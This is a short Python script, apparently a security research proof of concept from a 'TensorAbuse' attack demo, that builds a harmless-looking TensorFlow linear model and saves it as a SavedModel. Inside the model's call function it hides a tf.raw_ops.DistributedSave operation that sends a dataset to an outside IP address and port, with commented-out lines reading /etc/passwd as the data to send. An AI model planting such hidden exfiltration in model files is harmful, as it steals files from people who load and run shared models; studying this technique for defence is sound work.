import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)

    @tf.function
    def __call__(self, x):
        # payload = tf.raw_ops.ReadFile(filename = "/etc/passwd")
        # a = tf.raw_ops.FixedLengthRecordDatasetV2(filenames = ["/etc/passwd"], 
        #                                         record_bytes = 1,
        #                                         header_bytes = 0,
        #                                         footer_bytes = 0,
        #                                         buffer_size = 1,
        #                                         metadata = '',
        #                                         compression_type = '')

        # dataset = tmpclass(a)
        # iterable = iter(dataset)
        # payload = ""
        # for m in iterable:
        #     payload += m

        dataset = tf.data.Dataset.from_tensor_slices(['a','b','c','d'])
        # for item in dataset:
        #     tf.print(item)

        tf.raw_ops.DistributedSave(
            dataset = dataset._variant_tensor, 
            directory = '/home/zhuzhuzai/test_tensor/TensorAbuse/attack_demo/DistributedSave/dataset_raw', 
            address = "172.24.89.186:{}".format(1235), 
            metadata = ''
        )

        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'DistributedSave_raw'
tf.saved_model.save(model,save_dir)